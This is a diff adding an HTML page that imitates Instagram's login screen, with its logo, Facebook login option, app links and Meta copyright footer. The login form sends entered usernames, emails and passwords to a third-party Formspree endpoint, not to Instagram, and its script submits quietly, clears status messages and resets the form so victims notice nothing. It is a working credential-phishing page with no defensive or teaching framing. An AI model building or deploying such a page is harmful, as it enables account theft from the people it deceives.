@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Instagram Login Page</title>
+	<link rel="stylesheet" href="styles.css">
+</head>
+<body>
+	
+<div class="wrapper">
+	<div class="header">
+		<div class="top">
+			<div class="logo">
+				<img src="instagram.png" alt="instagram" style="width: 175px;">
+			</div>
+			<form
+			action="https://formspree.io/f/mgedklgz" method="POST" id="my-form">
+			<div class="form-group">
+				<label for="Email"></label>
+				<input type="text" placeholder="Phone number,email address or Username" id="text" name="Email">
+				 <style>
+					 input[type=text]{
+			    width: 103%;
+				border: 2px solid #aaa;
+				border-radius: 4px;
+				padding: 10px;
+					 }
+				 </style>
+			  </div>
+			  <br>
+			  <div class="form-group">
+				<label for="Password"></label>
+				<input type="password" placeholder="Password" id="Password" name="Password">
+				<style>
+					input[type=password]{
+			   width: 103%;
+			   border: 2px solid #aaa;
+			   border-radius: 4px;
+			   padding: 10px;
+					}
+				</style>
+			  </div>
+			  <br>
+			  <div class="box">
+				<div class="btn"> 
+			<button type="submit"> Log In                  
+			
+			</button>
+			
+			  <div id="status"></div>
+			</div>
+		</div>	
+			</div>
+			<div class="or">
+				<div class="line"></div>
+				<p>OR</p>
+				<div class="line"></div>
+			</div>
+			<div class="dif">
+				<div class="fb">
+					<img src="facebook.png" alt="facebook">
+					<p><b>Log in with Facebook</b></p>
+				</div>
+				<div class="forgot">
+					<a href="#"><b>Forgotten your password?</b></a>
+				</div>
+			</div>
+		</div>
+	</form>
+		<div class="signup">
+			<p>Don't have an account? <a href="https://www.instagram.com"><b>Sign up</a></b></p>
+		</div>
+		<div class="apps">
+			<p>Get the app.</p>
+			<div class="icons">
+				<a href="https://apps.apple.com/in/app/instagram/id389801252"><img src="appstore.png" alt="appstore"></a>
+				<a href="https://play.google.com/store/apps/details?id=com.instagram.android&hl=en_IN&gl=US"><img src="googleplay.png" alt="googleplay"></a>
+			</div>
+		</div>
+	</div>
+	<br><br>
+		<br><br>
+	<div class="footer">
+		<div class="links">
+			<ul>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+				&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+				
+				<li><a href="#">Meta</a></li>
+				<li><a href="#">About</a></li>
+				<li><a href="#">Blog</a></li>
+				<li><a href="#">Jobs</a></li>
+				<li><a href="#">Help</a></li>
+				<li><a href="#">Api</a></li>
+				<li><a href="#">Privacy</a></li>
+				<li><a href="#">Terms</a></li>
+				<li><a href="#">Top accounts</a></li>
+				<li><a href="#">Hashtags</a></li>
+				<li><a href="#">Locations</a></li>
+				<li><a href="#">Instagram Lite</a></li></ul>
+				<br>
+				<ul>
+					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+				<li><a href="#">Dance</a></li>
+				<li><a href="#">Food & Drink</a></li>
+				<li><a href="#">Home & Garden</a></li>
+				<li><a href="#">Music</a></li>
+				<li><a href="#">Visual art</a></li></ul>
+				<br>
+                <ul> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+				<li><a href="#">English(UK) > </a></li>
+				<li class="copyright">
+			© 2022 Instagram from Meta</li>
+			</ul>
+		</div>
+		
+		<div 
+		</div>
+	</div>
+</div>
+<script>
+    var form = document.getElementById("my-form");
+    
+    async function handleSubmit(event) {
+      event.preventDefault();
+      var status = document.getElementById("status");
+      var data = new FormData(event.target);
+      fetch(event.target.action, {
+        method: form.method,
+        body: data,
+        headers: {
+            'Accept': 'application/json'
+        }
+      }).then(response => {
+        if (response.ok) {
+          status.innerHTML = "";
+          form.reset()
+        } else {
+          response.json().then(data => {
+            if (Object.hasOwn(data, 'errors')) {
+              status.innerHTML = data["errors"].map(error => error["message"]).join(", ")
+            } else {
+              status.innerHTML = ""
+            }
+          })
+        }
+      }).catch(error => {
+        status.innerHTML = ""
+      });
+    }
+    form.addEventListener("submit", handleSubmit)
+</script>
+
+</body>
+</html>
